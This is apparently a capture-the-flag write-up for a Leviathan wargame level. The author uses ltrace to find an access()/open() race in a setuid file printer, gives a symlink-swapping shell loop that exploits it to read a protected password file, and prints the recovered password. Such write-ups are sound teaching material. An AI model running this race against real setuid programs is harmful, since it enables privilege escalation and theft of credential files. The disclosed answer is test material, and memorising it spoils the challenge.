After logging in, there is a "printfile" executable in the home folder owned by leviathan3. Before doing anything with it, I ran `file` on it to see what kind of file it was, which returned:

```
./printfile: setuid ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d1b5e5f479cfe2970294b7e8b7af05257c24777f, not stripped
```

Running just the file by itself returns the usage for it.

```
*** File Printer ***
Usage: ./printfile filename
```

I then ran an `ltrace` on it with the password file to see what it actually does.

```
leviathan2@leviathan:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3
__libc_start_main(0x565556c0, 2, 0xffffd6d4, 0x565557b0 <unfinished ...>
access("/etc/leviathan_pass/leviathan3", 4)          = -1
puts("You cant have that file..."You cant have that file...
)                   = 27
+++ exited (status 1) +++
```

Well, that is somewhat helpful. I imagine the weak link will be the access function, since that seems to be the one that actually makes sure I am allowed access.

After a bit of research, I found info on a [race condition](https://en.wikipedia.org/wiki/Race_condition) for `access()`. Essentially, when there is a check via `access()` before an `open()` to open the file, the hacker can switch from a file they do have access to be a symbolic link to one that they do not have access to, and it will be opened for them.

That in mind, I made a /tmp/ folder to work in and in it created a script to basically bruteforce tricking the program into giving me access to the password.

```sh
#!/bin/sh
touch fake
while true; do
        ln -sf ./fake a &
        ~/printfile a &
        ln -sf /etc/leviathan_pass/leviathan3 a &
done
```

This ran and among the errors was the password I wanted.

Password: Ahdiemoo1j
